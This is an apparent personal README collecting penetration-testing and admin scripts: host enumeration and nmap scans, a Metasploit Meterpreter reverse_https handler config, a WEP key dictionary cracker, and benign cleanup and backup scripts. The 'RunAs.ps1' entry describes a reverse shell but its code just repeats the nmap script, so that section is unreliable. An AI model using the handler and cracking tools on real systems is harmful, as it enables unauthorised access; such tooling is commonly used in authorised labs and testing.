# Scripts

* LocalAdmins.ps1 - Checks a file of host servers for members of the Administrators, Remote Desktop Users, and Users local groups.
* NSLookUp.ps1 - Runs a NSLookUp query against a file of host servers.
* PrivateIP - Runs a Nmap scan on against a file of host servers with Private IP's to check both TCP and UDP ports.
* PublicIP - Runs a Nmap scan on against a file of host servers with Public IP's to check both TCP and UDP ports.
* RunAs.ps1 - Runs a 'RunAs' command to switch context of user whilst triggering and initiating a reverse shell to the attacker.
* Meterpreter.rc - Sets a Meterpreter listener/handler with options (msfconsole -q -r Meterpreter.rc).
* WEPCracker.py - Wrapper script to crack WEP using Airdecap-ng.
* SystemCleanUp.ps1 - This script cleans up temporary files older than 7 days, log files older than 30 days, and clears the Recycle Bin.


### LocalAdmins.ps1

```
$servers = Get-Content C:\servers.txt
$groups = 'Administrators', 'Remote Desktop Users', 'Users'
$results = foreach ($server in $servers) {
    foreach ($group in $groups) {
        $obj = [ADSI]"WinNT://$server/$group"
        $obj.Invoke('Members') | % {
            $path = ([adsi]$_).path
            [pscustomobject]@{
                Computer = $server
                Group = $group
                Domain = $(Split-Path (Split-Path $path) -Leaf)
                User = $(Split-Path $path -Leaf)
            }
        }
    }
}
$results
```

### NSLookUp.ps1

```
$servers = get-content "C:\temp\hostlist.txt"
foreach ($Server in $Servers)
{
    $Addresses = $null
    try {
        $Addresses = [System.Net.Dns]::GetHostAddresses("$Server").IPAddressToString
    }
    catch { 
        $Addresses = "Server IP cannot resolve."
    }
    foreach($Address in $addresses) {
        write-host $Server, $Address 
    }
}
```

### Private IP

```
#!/bin/bash
nmap -sC -sV -Pn -v -p- -iL ./Private -oG PrivateTCP.txt
nmap -sU -v -iL ./Private -oG PrivateUDP.txt
done
```

### Public IP

```
#!/bin/bash
nmap -sC -sV -Pn -v -p- -iL ./Public -oG PublicTCP.txt
nmap -sU -v -iL ./Public -oG PublicUDP.txt
done
```

### RunAs.ps1

```
#!/bin/bash
nmap -sC -sV -Pn -v -p- -iL ./Public -oG PublicTCP.txt
nmap -sU -v -iL ./Public -oG PublicUDP.txt
done
```

### Meterpreter.rc

```
use exploit/multi/handler 
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST 192.168.49.91 
set LPORT 443
set ExitOnSession false 
exploit -j -z 
```

### WEPCracker.py

```
#!/usr/bin/python

import sys, binascii, re
from subprocess import Popen, PIPE

f = open(sys.argv[1], 'r')
for line in f:
    wepKey = re.sub(r'\W+', '', line)
    
    if len(wepKey) != 5 :
        continue
    hexKey = binascii.hexlify(wepKey)
    print "Trying with WEP key: " +wepKey + " Hex: " + hexKey
    p = Popen(['/usr/bin/airdecap-ng', '-w', hexKey, 'WEP-Advanced.cap'], stdout=PIPE)
    output = p.stdout.read()
    finalResult = output.split('\n')[4]
    
    if finalResult.find('1') != -1 :
        print "Success WEP Key Found: " + wepKey
        sys.exit(0)
print "Failure! WEP key could not be found with the existing dictionary!"
```

### SystemCleanup.ps1

```
# System Cleanup Script
# Removes temporary files, log files, and clears recycle bin to optimize system performance

Write-Host "Starting System Cleanup..." -ForegroundColor Green

# Function to delete files from a specified directory older than a certain number of days
function Cleanup-Files {
    param (
        [string]$Path,
        [int]$DaysOld = 7
    )
    if (Test-Path $Path) {
        Get-ChildItem -Path $Path -Recurse -File | Where-Object {
            $_.CreationTime -lt (Get-Date).AddDays(-$DaysOld)
        } | Remove-Item -Force -Verbose
    } else {
        Write-Host "Path $Path does not exist." -ForegroundColor Yellow
    }
}

# Cleaning Windows Temp folder
Write-Host "Cleaning Temp folder..." -ForegroundColor Cyan
Cleanup-Files -Path "$env:Temp" -DaysOld 7

# Cleaning system Temp folder
Write-Host "Cleaning System Temp folder..." -ForegroundColor Cyan
Cleanup-Files -Path "C:\Windows\Temp" -DaysOld 7

# Deleting old log files
Write-Host "Cleaning Log files..." -ForegroundColor Cyan
Cleanup-Files -Path "C:\Windows\Logs" -DaysOld 30
Cleanup-Files -Path "C:\ProgramData\Logs" -DaysOld 30

# Clearing Recycle Bin
Write-Host "Clearing Recycle Bin..." -ForegroundColor Cyan
Clear-RecycleBin -Confirm:$false -Verbose

Write-Host "System Cleanup Completed!" -ForegroundColor Green
```

How to Use:<br/>
1. Save the script as SystemCleanup.ps1.<br/>
2. Open PowerShell as an Administrator.<br/>
3. Run the script using: .\SystemCleanup.ps1.<br/>

This script cleans up temporary files older than 7 days, log files older than 30 days, and clears the Recycle Bin. You can customize the paths and retention periods as needed. Let me know if you need further assistance!

### BackupAutomation.py

```
import os
import shutil
import time
from datetime import datetime

# Configuration
SOURCE_DIR = "/path/to/source"  # Path to the folder you want to back up
BACKUP_DIR = "/path/to/backup"  # Path where the backup will be stored
BACKUP_RETENTION_DAYS = 7       # Number of days to keep old backups

def create_backup(source, destination):
    """Creates a timestamped backup."""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    backup_path = os.path.join(destination, f"backup_{timestamp}")
    
    try:
        shutil.copytree(source, backup_path)
        print(f"Backup created successfully at {backup_path}")
    except Exception as e:
        print(f"Error creating backup: {e}")

def cleanup_old_backups(destination, retention_days):
    """Removes backups older than the retention period."""
    now = time.time()
    for folder in os.listdir(destination):
        folder_path = os.path.join(destination, folder)
        if os.path.isdir(folder_path):
            folder_age = now - os.path.getmtime(folder_path)
            if folder_age > retention_days * 86400:  # Convert days to seconds
                try:
                    shutil.rmtree(folder_path)
                    print(f"Deleted old backup: {folder_path}")
                except Exception as e:
                    print(f"Error deleting backup {folder_path}: {e}")

def main():
    # Ensure the backup directory exists
    if not os.path.exists(BACKUP_DIR):
        os.makedirs(BACKUP_DIR)

    # Create a new backup
    create_backup(SOURCE_DIR, BACKUP_DIR)

    # Cleanup old backups
    cleanup_old_backups(BACKUP_DIR, BACKUP_RETENTION_DAYS)

if __name__ == "__main__":
    main()
```

How to Use:<br/>
1. Save the script as BackupAutomation.py.<br/>
2. Replace /path/to/source with the directory you want to back up.<br/>
3. Replace /path/to/backup with the directory where you want the backups to be stored.<br/>
4. Run the script using: python BackupAutomation.py.<br/>

Features:
* Timestamped Backups: Creates backups with a unique timestamp in the name.
* Retention Policy: Automatically deletes backups older than the specified number of days.
* Error Handling: Includes basic error handling for common issues.
